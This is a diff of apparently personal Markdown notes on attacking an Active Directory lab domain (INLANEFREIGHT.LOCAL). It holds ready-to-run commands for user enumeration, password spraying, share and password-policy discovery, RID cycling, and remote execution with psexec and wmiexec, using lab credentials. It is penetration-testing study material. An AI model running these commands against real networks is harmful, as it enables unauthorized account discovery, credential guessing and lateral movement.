@@ -1,11 +1,10 @@
 [Enumerating Active Directory](#enumerating-active-directory)
-
 [Letaral Movement]
 
 
 # Enumerating Active Directory
 
-**Identifying Hosts**
+## Identifying Hosts
 ```bash
 # wireshark
 sudo -E wireshark
@@ -17,12 +16,55 @@ sudo tcpdump -i ens224
 fping -asgq 172.16.5.0/23
 ```
 
-**Identifying Users && user enum**
-- kerbrute
-- https://github.com/insidetrust/statistically-likely-usernames/blob/master/jsmith.txt
+## Identifying Users && user/group/share enum && password policy && password spray
+**kerbrute**
+```bash
+# useful username list
+https://github.com/insidetrust/statistically-likely-usernames/blob/master/jsmith.txt
+
 kerbrute userenum -d INLANEFREIGHT.LOCAL --dc 172.16.5.5 jsmith.txt -o valid_ad_users
 
-- netexec
+# password spraying
+kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1
+```
+
+**enum4linux**
+```bash
+enum4linux -U 172.16.5.5  | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
+```
+
+**ldapsearch**
+```bash
+ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))"  | grep sAMAccountName: | cut -f2 -d" "
+```
+
+**windapsearch**
+```bash
+./windapsearch.py --dc-ip 172.16.5.5 -u "" -U
+
+# domain admins
+python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 --da
+
+# Privileged Users
+python3 windapsearch.py --dc-ip 172.16.5.5 -u forend@inlanefreight.local -p Klmcargo2 -PU
+```
+
+**crackmapexec**
+```bash
+# userenum
+crackmapexec smb 172.16.5.5 --users
+
+# group enum
+sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups
+
+# loggedon users
+sudo crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users
+
+# password spray
+sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 --continue-on-success
+```
+
+**netexec**
 ```bash
 # if user exists, it will say "KDC_ERR_PREAUTH_FAILED"
 # if user doesn't exist, it will say "KDC_ERR_C_PRINCIPAL_UNKNOWN"
@@ -41,64 +83,29 @@ netexec smb 10.x.x.x -u users.txt -p users.txt --no-bruteforce --continue-on-suc
 netexec smb 10.x.x.x -u 'operator' -p 'operator' --shares
 ```
 
-- rpcclient
+**rpcclient**
 ```bash
 # first login as some guest user
 rpcclient 10.10.x.x -U guest
+> enumdomusers
+
+# when enumdomusers don't work and lookupnames work...
 > lookupnames administrator
 > get the sid and change the user side at the very last part(500)
 > user's sid start from 1000 so we can start enumerating from there
 > lookupsids S-1-5-21-4078382237-1492182817-2568127209-1000
 
+# if lookupnames doesn't work
+> queryuser 0x1F4
+(change decimal number 500 to hex number)
+
 for i in $(seq 500 4000);do rpcclient -N -U "" 10.129.14.128 -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo "";done
+
+# man page
+man rpcclient
 ```
-
-**Enumerating & Retrieving Password Policies**
-- crackmapexec
-```bash
-crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol
-```
-
-- rpcclient
-```bash
-rpcclient -U "" -N 172.16.5.5
-rpcclient $> getdompwinfo
-```
-
-- enum4linux-ng
-```bash
-enum4linux-ng -P 172.16.5.5 -oA ilfreight
-```
-
-- ldapsearch
-```bash
-ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
-```
-
-- powerview
-```bash
-import-module .\PowerView.ps1
-Get-DomainPolicy
-```
-
-- on windows
-```bash
-net use \\DC01\ipc$ "" /u:""
-net use \\DC01\ipc$ "" /u:guest
-net use \\DC01\ipc$ "password" /u:guest
-
-```
-
-**command injection**
-```bash
-runas.exe /netonly /user:<domain>\<username> cmd.exe
-
-```
-
-
 
 **net**
-
 ```bash
 net accounts
 net user /domain
@@ -110,6 +117,64 @@ net group "Management Department" /domain
 net group "Management Department" stephanie /add /domain
 net group "Management Department" stephanie /del /domain
 ```
+
+**smbmap**
+```bash
+smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5
+smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only
+```
+
+## Enumerating & Retrieving Password Policies
+**crackmapexec**
+```bash
+crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol
+```
+
+**rpcclient**
+```bash
+rpcclient -U "" -N 172.16.5.5
+rpcclient $> getdompwinfo
+```
+
+**enum4linux-ng**
+```bash
+enum4linux-ng -P 172.16.5.5 -oA ilfreight
+```
+
+**ldapsearch**
+```bash
+ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
+```
+
+**powerview**
+```bash
+import-module .\PowerView.ps1
+Get-DomainPolicy
+```
+
+**net**
+```bash
+net use \\DC01\ipc$ "" /u:""
+net use \\DC01\ipc$ "" /u:guest
+net use \\DC01\ipc$ "password" /u:guest
+
+```
+
+## LAPS
+```bash
+
+
+```
+
+**command injection**
+```bash
+runas.exe /netonly /user:<domain>\<username> cmd.exe
+
+```
+
+
+
+
 
 **PowerView**
 ```bash
@@ -232,6 +297,12 @@ psexec64.exe \\MACHINE_IP -u Administrator -p Mypass123 -i cmd.exe
 
 psexec.py <% tp.frontmatter["DOMAIN"] %>/<% tp.frontmatter["USERNAME"] %>:'<% tp.frontmatter["PASSWORD"] %>'@<% tp.frontmatter["RHOST"] %>
 psexec.py -hashes  ntlm:ntlm <% tp.frontmatter["USERNAME"] %>@<% tp.frontmatter["RHOST"] %>
+```
+
+**wmiexec**
+```bash
+wmiexec.py inlanefreight.local/wley:'transporter@4'@172.16.5.5
+
 ```
 
 **WinRM**
